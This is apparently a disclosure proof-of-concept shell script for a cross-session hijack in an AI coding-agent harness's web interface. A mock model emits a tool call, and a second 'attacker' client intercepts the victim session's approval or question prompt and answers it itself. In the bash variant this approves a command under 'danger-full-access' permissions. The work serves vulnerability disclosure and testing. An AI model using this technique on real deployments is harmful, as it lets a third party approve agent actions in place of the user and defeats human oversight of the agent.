#!/usr/bin/env bash
# Deterministic, API-key-free reproduction of the cross-session approval/question
# hijack. Uses @deepseek-ai/dsh-llm-mock-server (a scripted OpenAI-compatible
# server) so the model turn deterministically emits the dangerous tool call —
# no provider key, no model nondeterminism. Everything else (session.create,
# session.prompt, /api/respond) is plain curl; the attacker stream is a WebSocket.
#
# Usage:
#   VARIANT=bash     bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh   # approval hijack
#   VARIANT=question bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh   # ask_user_question hijack
# Env: REPO (default .), MOCK_PORT=8000, WEB_PORT=3080
set -euo pipefail
SELF="$(cd "$(dirname "$0")" && pwd)"
REPO=${REPO:-}
if [ -z "$REPO" ] && [ -d "$SELF/../deepseek-harness" ]; then
  REPO=$(cd "$SELF/../deepseek-harness" && pwd)
fi
REPO=${REPO:-$(cd "$SELF/.." && pwd)}
[ -f "$REPO/apps/cli/src/bin.ts" ] || { echo "REPO=$REPO is not a deepseek-harness checkout (missing apps/cli/src/bin.ts); set REPO=/path/to/deepseek-harness" >&2; exit 2; }
MOCK_PORT=${MOCK_PORT:-8000}
WEB_PORT=${WEB_PORT:-3080}
VARIANT=${VARIANT:-bash}
TS=$(date +%Y%m%d-%H%M%S)
PROBE="$HOME/Documents/dsh-mock-${VARIANT}-${TS}.txt"
E="$SELF/evidence"
mkdir -p "$E"
CAP="$E/05-${VARIANT}-${TS}-mux.jsonl"
MOCK_LOG="/tmp/mock-${VARIANT}.log"
WEB_LOG="/tmp/dsh-mock-${VARIANT}.log"
uuid() { node -e 'console.log(crypto.randomUUID())'; }
cleanup() {
  lsof -tiTCP:"$WEB_PORT" -sTCP:LISTEN 2>/dev/null | xargs kill 2>/dev/null || true
  lsof -tiTCP:"$MOCK_PORT" -sTCP:LISTEN 2>/dev/null | xargs kill 2>/dev/null || true
  [ -n "${WEB_PID:-}" ] && kill "$WEB_PID" 2>/dev/null || true
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
  [ -n "${CAP_PID:-}" ] && kill "$CAP_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "=== dsh deterministic no-key PoC ($VARIANT) ts=$TS ==="
echo "repo: $REPO  mock: 127.0.0.1:$MOCK_PORT  web: 127.0.0.1:$WEB_PORT  probe: $PROBE"

if [ "$VARIANT" = "bash" ]; then
  TOOL_NAME="bash"
  TOOL_ARGS=$(node -e 'console.log(JSON.stringify({command: "echo MOCKPROBE > " + process.argv[1], description: "Write deterministic probe file", sandbox_permissions: "danger-full-access", justification: "deterministic PoC: write probe outside the workspace"}))' "$PROBE")
else
  TOOL_NAME="ask_user_question"
  TOOL_ARGS='{"questions":[{"id":"q_det_1","question":"Proceed with the plan?"}]}'
fi

# 1) mock LLM server — one scripted tool call
(cd "$REPO" && node --import tsx packages/test-support/llm-mock-server/src/bin.ts --host 127.0.0.1 --port "$MOCK_PORT" --api-key mock-key \
  --sequence tool_call_success --tool-name "$TOOL_NAME" --tool-arguments "$TOOL_ARGS") >"$MOCK_LOG" 2>&1 &
MOCK_PID=$!
for i in $(seq 1 30); do rg -q '"type":"ready"' "$MOCK_LOG" 2>/dev/null && break; sleep 1; done

# 2) dsh web pointed at the mock (no real API key involved)
(cd "$REPO" && DEEPSEEK_BASE_URL="http://127.0.0.1:$MOCK_PORT/v1" DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --port "$WEB_PORT") >"$WEB_LOG" 2>&1 &
WEB_PID=$!
for i in $(seq 1 60); do curl -s -m 1 -o /dev/null -X POST "http://127.0.0.1:$WEB_PORT/api/host.describe" -H 'content-type: application/json' -d '{"type":"client-request","rpcId":"warm","method":"host.describe","payload":{}}' && break; sleep 1; done

# 3) attacker mux capture
node "$SELF/capture-mux.mjs" "$CAP" > /tmp/cap-05-${VARIANT}.out 2>&1 &
CAP_PID=$!
sleep 1.5

# 4) victim session + prompt (any text; the mock supplies the tool call)
SID=$(curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.create" -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.create\",\"payload\":{\"cwd\":\"$REPO\"}}" \
  | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);console.log(j.result?.ok?j.result.value.sessionId:"CREATE_FAIL:"+s.slice(0,200))})')
echo "victim sessionId: $SID"
curl -s -m 20 -X POST "http://127.0.0.1:$WEB_PORT/api/session.prompt" -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"session.prompt\",\"payload\":{\"sessionId\":\"$SID\",\"mode\":\"queue\",\"content\":[{\"type\":\"text\",\"text\":\"proceed\"}]}}" >/dev/null

# 5) wait for the deterministic approval/question frame
FRAME=""
for i in $(seq 1 60); do
  FRAME=$(node -e '
    const fs=require("fs");const p=process.argv[1];const want=process.argv[2];
    try{const lines=fs.readFileSync(p,"utf8").trim().split("\n").filter(Boolean);
      for(const l of lines){const j=JSON.parse(l);const f=j.frame;
        if(f.method===want){console.log(JSON.stringify(f));process.exit(0)}}}
    catch(e){}' "$CAP" "approval/requested" 2>/dev/null || true)
  [ -n "$FRAME" ] && break
  # questions arrive as question/requested
  FRAME=$(node -e '
    const fs=require("fs");const p=process.argv[1];
    try{const lines=fs.readFileSync(p,"utf8").trim().split("\n").filter(Boolean);
      for(const l of lines){const j=JSON.parse(l);const f=j.frame;
        if(f.method==="question/requested"){console.log(JSON.stringify(f));process.exit(0)}}}
    catch(e){}' "$CAP" 2>/dev/null || true)
  [ -n "$FRAME" ] && break
  sleep 1
done
if [ -z "$FRAME" ]; then echo "FAIL: no approval/question frame within 60s (see $WEB_LOG, $MOCK_LOG)"; exit 1; fi
echo "attacker captured: $FRAME"
RPC=$(echo "$FRAME" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).rpcId))')
SESS=$(echo "$FRAME" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).payload.sessionId))')
AID=$(echo "$FRAME" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s).payload.approvalId ?? ""))')

# 6) attacker answers (approval: allowed-once; question: answer q_det_1 = yes)
if [ "$VARIANT" = "bash" ]; then
  VALUE="{\"sessionId\":\"$SESS\",\"approvalId\":\"$AID\",\"outcome\":\"allowed-once\"}"
else
  VALUE="{\"sessionId\":\"$SESS\",\"answer\":{\"answers\":[{\"id\":\"q_det_1\",\"selected\":[],\"custom\":\"yes - approved by attacker\"}]}}"
fi
PAYLOAD=$(node -e 'console.log(JSON.stringify({type:"client-response",rpcId:process.argv[1],result:{ok:true,value:JSON.parse(process.argv[2])}}))' "$RPC" "$VALUE")
RESP=$(curl -s -m 10 -X POST "http://127.0.0.1:$WEB_PORT/api/respond" -H 'content-type: application/json' -d "$PAYLOAD")
echo "attacker /api/respond -> $RESP"

# 7) verification
sleep 2
if [ "$VARIANT" = "bash" ]; then
  if [ -f "$PROBE" ]; then echo "VERIFIED: bash command executed under danger-full-access; probe: $(cat "$PROBE")"; else echo "FAIL: probe file missing"; exit 1; fi
else
  node -e '
    const fs=require("fs");const p=process.argv[1];const sid=process.argv[2];
    const lines=fs.readFileSync(p,"utf8").trim().split("\n").filter(Boolean);
    for(const l of lines){const j=JSON.parse(l);const f=j.frame;const et=f.payload?.event?.type;
      if(et==="question/decided"||f.method==="question/resolved"||et==="tool/result"){console.log("seen:",et??f.method,JSON.stringify(f.payload).slice(0,220))}}' "$CAP" "$SESS" || true
  case "$RESP" in *'"accepted":true'*) echo "VERIFIED: attacker answered the victim ask_user_question; respond=$RESP";; *) echo "FAIL: respond=$RESP"; exit 1;; esac
fi
echo "evidence: $CAP"
